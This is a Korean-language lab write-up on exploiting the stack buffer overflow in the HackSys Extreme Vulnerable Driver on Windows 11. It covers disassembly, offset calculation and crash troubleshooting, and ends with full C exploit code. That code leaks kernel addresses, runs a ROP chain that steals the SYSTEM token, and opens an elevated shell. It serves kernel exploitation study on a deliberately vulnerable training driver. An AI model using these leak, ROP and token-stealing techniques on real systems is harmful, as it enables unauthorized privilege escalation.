---
title: "[HEVD] Buffer Overflow Stack"
categories: [Windows Kernel]
---

## 1. Vulnerability Research

환경 : Win11 23H2

```c
__int64 __fastcall TriggerBufferOverflowStack(void *UserBuffer, size_t Size)
{
  unsigned int KernelBuffer[512]; // [rsp+20h] [rbp-838h] BYREF

  memset_thunk_772440563353939046(KernelBuffer, 0, 0x800uLL);
  ProbeForRead(UserBuffer, 0x800uLL, 1u);
  DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", UserBuffer);
  DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%zX\n", Size);
  DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", KernelBuffer);
  DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%zX\n", 0x800uLL);
  DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in Stack\n");
  memmove(KernelBuffer, UserBuffer, Size);
  return 0LL;
}
```

1. UserBuffer의 내용을 Size 검증 없이 KernelBuffer로 그대로 복사함.
2. KernelBuffer의 크기를 뛰어넘는 값을 작성하면 Return Address를 조작할 수 있음. ( ROP 가능 )

---

## 2. IDA를 활용한 OFFSET 확인

```nasm
PAGE:0000000140087510 ; =============== S U B R O U T I N E =======================================
PAGE:0000000140087510
PAGE:0000000140087510
PAGE:0000000140087510 ; __int64 __fastcall TriggerBufferOverflowStack(void *UserBuffer, size_t Size)
PAGE:0000000140087510 TriggerBufferOverflowStack proc near    ; CODE XREF: BufferOverflowStackIoctlHandler+15↑p
PAGE:0000000140087510                                         ; DATA XREF: .pdata:00000001400851A4↑o
PAGE:0000000140087510
PAGE:0000000140087510 KernelBuffer    = dword ptr -838h
PAGE:0000000140087510
PAGE:0000000140087510 UserBuffer = rcx
PAGE:0000000140087510 Size = rdx
PAGE:0000000140087510 ; __unwind { // __C_specific_handler_0
PAGE:0000000140087510                 push    rbx
PAGE:0000000140087512                 push    rsi
PAGE:0000000140087513                 push    rdi
PAGE:0000000140087514                 push    r12
PAGE:0000000140087516                 push    r14
PAGE:0000000140087518                 push    r15
PAGE:000000014008751A                 sub     rsp, 828h
PAGE:0000000140087521                 mov     rsi, Size
PAGE:0000000140087524                 mov     rdi, UserBuffer
PAGE:0000000140087527                 xor     ebx, ebx
PAGE:0000000140087529                 mov     r12d, 800h
PAGE:000000014008752F                 mov     r8d, r12d       ; Size
PAGE:0000000140087532                 xor     edx, edx        ; Val
PAGE:0000000140087534                 lea     UserBuffer, [rsp+858h+KernelBuffer] ; void *
PAGE:0000000140087539                 call    memset$thunk$772440563353939046
PAGE:000000014008753E                 nop
PAGE:000000014008753F
PAGE:000000014008753F loc_14008753F:                          ; DATA XREF: .rdata:00000001400037E4↑o
PAGE:000000014008753F ;   __try { // __except at $LN6_0       ; Alignment
PAGE:000000014008753F                 lea     r8d, [rbx+1]
PAGE:0000000140087543                 mov     edx, r12d       ; Length
PAGE:0000000140087546                 mov     UserBuffer, rdi ; Address
PAGE:0000000140087549                 call    cs:__imp_ProbeForRead
PAGE:000000014008754F                 mov     r9, rdi
PAGE:0000000140087552                 lea     r8, aUserbuffer0xP ; "[+] UserBuffer: 0x%p\n"
PAGE:0000000140087559                 lea     r15d, [rbx+3]
PAGE:000000014008755D                 mov     edx, r15d       ; Level
PAGE:0000000140087560                 lea     r14d, [rbx+4Dh]
PAGE:0000000140087564                 mov     ecx, r14d       ; ComponentId
PAGE:0000000140087567                 call    cs:__imp_DbgPrintEx
PAGE:000000014008756D                 mov     r9, rsi
PAGE:0000000140087570                 lea     r8, aUserbufferSize ; "[+] UserBuffer Size: 0x%zX\n"
PAGE:0000000140087577                 mov     edx, r15d       ; Level
PAGE:000000014008757A                 mov     ecx, r14d       ; ComponentId
PAGE:000000014008757D                 call    cs:__imp_DbgPrintEx
PAGE:0000000140087583                 lea     r9, [rsp+858h+KernelBuffer]
PAGE:0000000140087588                 lea     r8, aKernelbuffer0x ; "[+] KernelBuffer: 0x%p\n"
PAGE:000000014008758F                 mov     edx, r15d       ; Level
PAGE:0000000140087592                 mov     ecx, r14d       ; ComponentId
PAGE:0000000140087595                 call    cs:__imp_DbgPrintEx
PAGE:000000014008759B                 mov     r9d, r12d
PAGE:000000014008759E                 lea     r8, aKernelbufferSi ; "[+] KernelBuffer Size: 0x%zX\n"
PAGE:00000001400875A5                 mov     edx, r15d       ; Level
PAGE:00000001400875A8                 mov     ecx, r14d       ; ComponentId
PAGE:00000001400875AB                 call    cs:__imp_DbgPrintEx
PAGE:00000001400875B1                 lea     r8, aTriggeringBuff_2 ; "[+] Triggering Buffer Overflow in Stack"...
PAGE:00000001400875B8                 mov     edx, r15d       ; Level
PAGE:00000001400875BB                 mov     ecx, r14d       ; ComponentId
PAGE:00000001400875BE                 call    cs:__imp_DbgPrintEx
PAGE:00000001400875C4                 mov     r8, rsi         ; Size
PAGE:00000001400875C7                 mov     Size, rdi       ; Src
PAGE:00000001400875CA                 lea     UserBuffer, [rsp+858h+KernelBuffer] ; void *
PAGE:00000001400875CF                 call    memmove
PAGE:00000001400875D4                 jmp     short loc_1400875F1
PAGE:00000001400875D4 ;   } // starts at 14008753F
```

1. Function Prologue에서 6개의 레지스터를 Push
2. 이후 sub rsp, 828h 진행
3. Stack Frame 상으로, Stack의 처음부터 Return Address까지는 OFFSET이 0x858임을 확인할 수 있음.
4. KernelBuffer는 0x838부터 써짐을 IDA로 확인할 수 있음.
5. 즉, Return Address까지는 OFFSET은 0x838이 됨.

```nasm
Stack Frame

rsp+0x000  - home space (0x20)
rsp+0x020  - KernelBuffer[0x800]
rsp+0x820  - (로컬 나머지 ~0x828 영역)
rsp+0x828  - saved r15,r14,r12,rdi,rsi,rbx (0x30)
rsp+0x858  - return address
```

---

## 3. Attack Scenario

1. Buffer Overflow 취약점을 이용하여 OFFSET을 덮고, 이후 ret 주소를 조작하여 ROP 진행.
2. 일반적으로 ntoskrnl.exe이 최초로 로드되는 모듈이라는 점을 이용하여, ntoskrnl의 Gadget을 활용.
3. Win11 23H2 환경까지는 NtQuerySystemInformation 이라는 API를 활용하여 ntoskrnl의 커널 베이스를 구할 수 있음.
4. 기본적으로 Mitigation 즉, SMEP/SMAP이 켜져 있기에 CR4 레지스터의 비트를 조작하여 Mitigation을 끄는 것보다 ROP를 활용하여 Token Stealing을 진행하여 Current Process의 권한을 System으로 변경하는 것이 목표.

---

## 4. Trouble Shooting

### **BSOD #1 — APC_INDEX_MISMATCH (0x1)**

- ROP 이후 Ret 주소로 swapgs; iretq 가젯을 사용하여 유저모드로 복귀하려고 시도.

| 항목 | 내용                                                                                                            |
| ---- | --------------------------------------------------------------------------------------------------------------- |
| 시도 | `swapgs; iretq` 로 유저모드 복귀 시도 → APC_INDEX_MISMATCH                                                      |
| 원인 | ROP로 유저모드로 나가면 IRP가 완료되지 않고, 파일 오브젝트 락(guarded region)이 안 풀림 → APC 상태 불일치       |
| 해결 | `iretq` 복귀 폐기. 대신 드라이버 안으로 클린 복귀: `HEVD_base+0x86249` 로 돌아가 `IofCompleteRequest` 정상 실행 |
|      | 커널 익스는 정상 흐름 복귀가 안전함. IRP를 반드시 완료시켜야 함.                                                |

### BSOD #2 — SYSTEM_SERVICE_EXCEPTION (0x3b)

- 커널 내로 복귀 시도

| 항목 | 내용                                                                                                                                                                                                                                                                                                                                         |
| ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 시도 | 클린 복귀 버전으로 바꿨더니 `nt!IopReleaseFileObjectLock` 에서 AV, `rbx=0x41`                                                                                                                                                                                                                                                                |
| 원인 | `TriggerBufferOverflowStack`는 `rbx, rsi, rdi, r12, r14, r15` 저장 → 오버플로우가 저장 슬롯을 `0x41`로 덮음. 그런데 경유지 `IrpDeviceIoCtlHandler`는 `rbx, rbp, rsi, rdi, r14`만 복원 → `r12, r15`는 아무도 복원 안 함 → `0x41`이 `IopSynchronousServiceTail`까지 전파, `FILE_OBJECT`를 `r12/r15`에 들고 `IopReleaseFileObjectLock`에서 죽음 |
| 해결 | `r12/r15` 저장 슬롯에 릭한 `FILE_OBJECT`를 미리 넣어 복원: `buf[0x808]=r15`, `buf[0x818]=r12` (ROP 슬롯 안 늘려 rsp 정렬 유지)                                                                                                                                                                                                               |
|      | 클린 복귀는 rsp 정렬만으론 부족. 경유 함수가 복원 안 하는 callee-saved 레지스터(`r12/r15`)까지 유효값으로 채워야 함                                                                                                                                                                                                                          |

### Clean Return Address 계산 ( Function Epilogue )

```nasm
PAGE:00000001400874F0 ; int __fastcall BufferOverflowStackIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
PAGE:00000001400874F0 BufferOverflowStackIoctlHandler proc near
PAGE:00000001400874F0                                         ; CODE XREF: IrpDeviceIoCtlHandler+1C8↑p
PAGE:00000001400874F0                                         ; DATA XREF: .pdata:0000000140085198↑o
PAGE:00000001400874F0 Irp = rcx
PAGE:00000001400874F0 IrpSp = rdx
PAGE:00000001400874F0                 sub     rsp, 28h
PAGE:00000001400874F4                 mov     Irp, [IrpSp+20h] ; UserBuffer
PAGE:00000001400874F8                 mov     eax, 0C0000001h
PAGE:00000001400874FD                 test    Irp, Irp
PAGE:0000000140087500                 jz      short loc_14008750A
PAGE:0000000140087502                 mov     edx, [IrpSp+10h] ; Size
PAGE:0000000140087505                 call    TriggerBufferOverflowStack
PAGE:000000014008750A
PAGE:000000014008750A loc_14008750A:                          ; CODE XREF: BufferOverflowStackIoctlHandler+10↑j
PAGE:000000014008750A                 add     rsp, 28h
PAGE:000000014008750E                 retn
PAGE:000000014008750E BufferOverflowStackIoctlHandler endp
PAGE:000000014008750E
```

TriggerBOS 리턴슬롯 K+0x838 (= base+0x858, RIP_OFFSET 0x838)
TriggerBOS retn (pop +8) → K+0x840
IoctlHandler add rsp,28h (+0x28) → K+0x868
IoctlHandler retn (pop +8) → K+0x870 = base+0x890 ← 복귀 시 rsp 위치

---

## 5. Exploit Code

```c
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <winternl.h>

#define RIP_OFFSET        0x838
#define OFF_EPROC_TOKEN   0x4B8

#define RVA_POP_RAX       0x66649c
#define RVA_POP_RDX       0x7aa8b9
#define RVA_MEM2MEM       0xadf66d
#define RVA_RET           0x6660dd

#define RVA_HEVD_RETURN   0x86249

// Set NtQuerySystemInformation
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1]; // 가변 배열
} RTL_PROCESS_MODULES;

static uint64_t GetModuleBase(const char *name) {
    ULONG len = 0;
    // 버퍼 크기를 0으로 설정하여, 로드된 모듈의 개수를 동적으로 할당받음.
    NtQuerySystemInformation(11, NULL, 0, &len);
    RTL_PROCESS_MODULES *m = VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    // 이후 모듈 정보 leak
    NtQuerySystemInformation(11, m, len, &len);

    uint64_t base = 0;
    if (!name) { base = (uint64_t)m->Modules[0].ImageBase; } // modules Name이 없으면 ntoskrnl 주소 leak
    else {
        for (ULONG i = 0; i < m->NumberOfModules; i++) {
            if (strstr((char*)m->Modules[i].FullPathName, name)) {
                base = (uint64_t)m->Modules[i].ImageBase; break;
            }
        }
    }
    VirtualFree(m, 0, MEM_RELEASE);
    return base;
}

typedef struct _SYS_HANDLE_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYS_HANDLE_EX;

typedef struct _SYS_HANDLE_INFO_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYS_HANDLE_EX Handles[1]; // 핸들을 위한 가변 배열 설정
} SYS_HANDLE_INFO_EX;

// Handle이 가리키는 .Object 주소를 알아내는 함수
static uint64_t LeakObjectForHandle(HANDLE h) {
    DWORD myPid = GetCurrentProcessId();
    ULONG len = 0x10000;
    SYS_HANDLE_INFO_EX *info = NULL;
    NTSTATUS st; //32bit 정수 에러 코드. 최상위 비트로 성공/실패를 판단함.

    do {
        if (info) VirtualFree(info, 0, MEM_RELEASE);

        info = VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        st = NtQuerySystemInformation(0x40, info, len, &len);   // SystemExtendedHandleInformation
    } while (st == (NTSTATUS)0xC0000004);                       // STATUS_INFO_LENGTH_MISMATCH

    uint64_t obj = 0;
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        SYS_HANDLE_EX *e = &info->Handles[i];
        if (e->UniqueProcessId == myPid && (HANDLE)e->HandleValue == h) { obj = (uint64_t)e->Object; break; }
    }

    VirtualFree(info, 0, MEM_RELEASE);
    return obj;
}

int main() {
    uint64_t kbase   = GetModuleBase(NULL);
    uint64_t hevd    = GetModuleBase("HEVD");

        // CurrentProcess와 System 권한 Process에 대한 Handle 획득
    HANDLE hSelf = NULL;
    DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(),
                    &hSelf, PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0);
    uint64_t curEproc = LeakObjectForHandle(hSelf);

    HANDLE hSys = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
    uint64_t sysEproc = LeakObjectForHandle(hSys);

    uint64_t srcTok = sysEproc + OFF_EPROC_TOKEN;   // &SYSTEM.Token
    uint64_t dstTok = curEproc + OFF_EPROC_TOKEN;   // &current.Token

    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    uint64_t fileObj = LeakObjectForHandle(hDevice);

    uint64_t chain[7];
    chain[0] = kbase + RVA_POP_RAX;      // pop rax
    chain[1] = srcTok;                   //   rax = &SYSTEM.Token
    chain[2] = kbase + RVA_POP_RDX;      // pop rdx
    chain[3] = dstTok;                   //   rdx = &current.Token
    chain[4] = kbase + RVA_MEM2MEM;      // *rdx = *rax
    chain[5] = kbase + RVA_RET;          // ret
    chain[6] = hevd  + RVA_HEVD_RETURN;

    SIZE_T total = RIP_OFFSET + sizeof(chain);
    uint8_t *buf = VirtualAlloc(NULL, total, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    memset(buf, 0x41, RIP_OFFSET);

    *(uint64_t*)(buf + 0x808) = fileObj;   // r15
    *(uint64_t*)(buf + 0x818) = fileObj;   // r12
    memcpy(buf + RIP_OFFSET, chain, sizeof(chain));

    DWORD br = 0;
    DeviceIoControl(hDevice, 0x222003, buf, (DWORD)total, NULL, 0, &br, NULL);

    system("cmd.exe");

    return 0;
}
```
